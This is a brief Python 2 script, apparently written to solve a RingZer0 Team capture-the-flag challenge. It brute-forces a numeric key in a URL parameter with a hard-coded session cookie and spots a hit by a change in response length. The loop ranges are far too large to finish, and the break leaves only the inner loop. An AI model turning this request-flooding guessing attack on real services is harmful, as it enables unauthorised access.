import requests

def go():
	url = 'http://ringzer0team.com/challenges/113/?k=';
	cookies = dict(PHPSESSID='vdakmp5t67elsra7bfpr5tb5q4',_ga='GA1.2.517894686.1428888833', _gat='1');
	
	for j in range(10000000000,99999999999):
		for k in range(0,100000):
			i = str(j) + str(k);
			print i;
			finalurl = url + i;
			print 'finalurl:' + finalurl;
			r = requests.get(finalurl,cookies = cookies);
		
			#print 'r.text:' + r.text;
			if len(r.text) != 6026 :
				r.close();
				print finalurl;
				break;
		
			r.close();


if __name__ == '__main__':
	go();	
		


